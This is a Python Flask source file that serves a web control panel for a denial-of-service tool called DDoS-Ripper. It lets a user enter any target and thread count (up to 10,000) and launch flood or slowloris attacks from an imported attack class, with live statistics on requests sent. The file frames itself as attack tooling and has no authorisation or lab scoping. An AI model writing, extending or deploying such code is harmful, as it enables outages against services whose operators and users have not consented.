#!/usr/bin/env python3
"""
Flask Web Application for DDoS-Ripper
Web-based frontend for the DDoS tool
"""

from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import threading
import time
from DRipper import DRipper
import json

app = Flask(__name__)
app.config['SECRET_KEY'] = 'ddos-ripper-secret-key-2024'
socketio = SocketIO(app, cors_allowed_origins="*")

# Global attack instance
current_attack = None
attack_thread = None
stats_thread = None


def run_attack(target, threads, mode):
    """Run attack in a separate thread"""
    global current_attack
    
    try:
        current_attack = DRipper(target=target, threads=threads)
        current_attack.start_time = time.time()
        
        # Start stats broadcasting thread
        def broadcast_stats():
            while current_attack and current_attack.running:
                time.sleep(1)
                if current_attack:
                    with current_attack.lock:
                        stats = {
                            'total': current_attack.stats['total'],
                            'success': current_attack.stats['success'],
                            'failed': current_attack.stats['failed'],
                            'errors': dict(current_attack.stats['errors']),
                            'duration': time.time() - current_attack.start_time
                        }
                        socketio.emit('stats_update', stats)
        
        stats_broadcast = threading.Thread(target=broadcast_stats, daemon=True)
        stats_broadcast.start()
        
        # Run attack - create worker threads
        attack_func = current_attack.slowloris_attack if mode == 'slowloris' else current_attack.attack
        
        threads_list = []
        for i in range(threads):
            thread = threading.Thread(target=attack_func, daemon=True)
            thread.start()
            threads_list.append(thread)
        
        # Keep running
        while current_attack.running:
            time.sleep(0.1)
            
    except Exception as e:
        socketio.emit('error', {'message': str(e)})


@app.route('/')
def index():
    """Main page"""
    return render_template('index.html')


@app.route('/api/start', methods=['POST'])
def start_attack():
    """Start attack"""
    global current_attack, attack_thread
    
    if current_attack and current_attack.running:
        return jsonify({'error': 'Attack already running'}), 400
    
    data = request.json
    target = data.get('target', '').strip()
    threads = int(data.get('threads', 135))
    mode = data.get('mode', 'flood')
    
    if not target:
        return jsonify({'error': 'Target is required'}), 400
    
    if threads < 1 or threads > 10000:
        return jsonify({'error': 'Threads must be between 1 and 10000'}), 400
    
    # Start attack in separate thread
    attack_thread = threading.Thread(
        target=run_attack,
        args=(target, threads, mode),
        daemon=True
    )
    attack_thread.start()
    
    return jsonify({'success': True, 'message': 'Attack started'})


@app.route('/api/stop', methods=['POST'])
def stop_attack():
    """Stop attack"""
    global current_attack
    
    if current_attack:
        current_attack.running = False
        time.sleep(1)
        
        # Get final stats
        final_stats = {
            'total': current_attack.stats['total'],
            'success': current_attack.stats['success'],
            'failed': current_attack.stats['failed'],
            'errors': dict(current_attack.stats['errors']),
            'duration': time.time() - current_attack.start_time if hasattr(current_attack, 'start_time') else 0
        }
        
        current_attack = None
        return jsonify({'success': True, 'stats': final_stats})
    
    return jsonify({'error': 'No attack running'}), 400


@app.route('/api/status', methods=['GET'])
def get_status():
    """Get current attack status"""
    global current_attack
    
    if current_attack and current_attack.running:
        with current_attack.lock:
            stats = {
                'running': True,
                'total': current_attack.stats['total'],
                'success': current_attack.stats['success'],
                'failed': current_attack.stats['failed'],
                'errors': dict(current_attack.stats['errors']),
                'duration': time.time() - current_attack.start_time if hasattr(current_attack, 'start_time') else 0,
                'target': current_attack.target,
                'threads': current_attack.threads
            }
        return jsonify(stats)
    
    return jsonify({'running': False})


@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    emit('connected', {'message': 'Connected to DDoS-Ripper'})


@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnection"""
    pass


if __name__ == '__main__':
    print("\n" + "=" * 70)
    print("🌐 DDoS-Ripper Web Interface")
    print("=" * 70)
    print("Starting web server...")
    print("Open your browser and navigate to: http://localhost:5000")
    print("Press Ctrl+C to stop the server")
    print("=" * 70 + "\n")
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)

